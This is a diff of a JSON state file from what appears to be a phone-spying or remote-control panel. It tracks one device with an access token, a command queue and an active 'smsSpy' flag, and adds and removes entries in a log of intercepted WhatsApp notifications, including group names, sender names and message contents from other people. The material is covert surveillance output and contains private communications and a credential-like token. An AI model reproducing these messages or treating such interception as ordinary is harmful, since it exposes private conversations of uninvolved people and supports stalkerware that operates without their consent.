@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777177925748,
+    "lastSeen": 1777177928636,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 2 chat",
+        "time": "26/04 12:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777177928704
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (6 pesan): ~ 사랑 ᥊ᥲbιruu.ʙᴏᴛ",
+        "content": "💟 Stiker",
+        "time": "26/04 12:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777177928693
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 2 chat",
+        "time": "26/04 12:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777177928631
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎7Sex Message (56 pesan): ~ P1",
+        "content": "Sayonara @⁨~Riski⁩",
+        "time": "26/04 12:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777177928613
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 2 chat",
+        "time": "26/04 12:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777177926299
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Pegasus-X Room (5 pesan): ~ 사랑 ᥊ᥲbιruu.ʙᴏᴛ",
@@ -3979,46 +4019,6 @@
         "time": "26/04 11:23",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173153355
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1137 pesan dari 19 chat",
-        "time": "26/04 11:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173153334
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1136 pesan dari 19 chat",
-        "time": "26/04 11:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173152830
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (46 pesan): ~ jiermeii😳",
-        "content": "my omom niej 🤤🤤",
-        "time": "26/04 11:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173152825
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1135 pesan dari 19 chat",
-        "time": "26/04 11:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173151473
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (45 pesan): ~ adalah pokoknya 😛",
-        "content": "Lgi?",
-        "time": "26/04 11:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173151117
       }
     ],
     "galleryPhotos": [],
